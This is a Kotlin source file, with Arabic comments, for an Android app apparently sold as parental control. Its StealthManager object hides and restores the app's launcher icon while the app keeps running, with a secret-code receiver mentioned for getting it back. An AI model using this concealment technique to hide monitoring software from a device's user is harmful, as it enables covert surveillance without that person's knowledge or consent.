package com.example.parentalcontrol

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log

/**
 * مدير التخفي
 * يقوم بإخفاء أيقونة التطبيق من القائمة
 */
object StealthManager {

    private const val TAG = "StealthManager"

    /**
     * إخفاء أيقونة التطبيق من اللانشر
     */
    fun hideAppIcon(context: Context) {
        try {
            val pkg = context.packageManager
            val aliasName = ComponentName(context, "${context.packageName}.LauncherAlias")
            
            Log.d(TAG, "Attempting to hide: ${aliasName.flattenToString()}")
            
            pkg.setComponentEnabledSetting(
                aliasName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP  // CRITICAL: don't kill app process
            )
            
            // Save state so SecretCodeReceiver knows the real state
            context.getSharedPreferences("stealth_prefs", Context.MODE_PRIVATE)
                .edit().putBoolean("icon_hidden", true).apply()
            
            Log.i(TAG, "Launcher alias disabled (DONT_KILL_APP)")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to hide launcher icon: ${e.message}")
        }
    }

    /**
     * إظهار أيقونة التطبيق (لأغراض المعايرة أو الإعداد)
     */
    fun showAppIcon(context: Context) {
        try {
            val pkg = context.packageManager
            val aliasName = ComponentName(context, "${context.packageName}.LauncherAlias")
            
            Log.d(TAG, "Attempting to show: ${aliasName.flattenToString()}")
            
            pkg.setComponentEnabledSetting(
                aliasName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            // Sync SharedPreferences
            context.getSharedPreferences("stealth_prefs", Context.MODE_PRIVATE)
                .edit().putBoolean("icon_hidden", false).apply()
            Log.i(TAG, "Launcher alias enabled successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to show launcher icon: ${e.message}")
        }
    }

    /**
     * التحقق مما إذا كانت الأيقونة مخفية
     */
    fun isIconHidden(context: Context): Boolean {
        return try {
            val pkg = context.packageManager
            val aliasName = ComponentName(context, "${context.packageName}.LauncherAlias")
            val state = pkg.getComponentEnabledSetting(aliasName)
            state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        } catch (e: Exception) {
            false
        }
    }
}
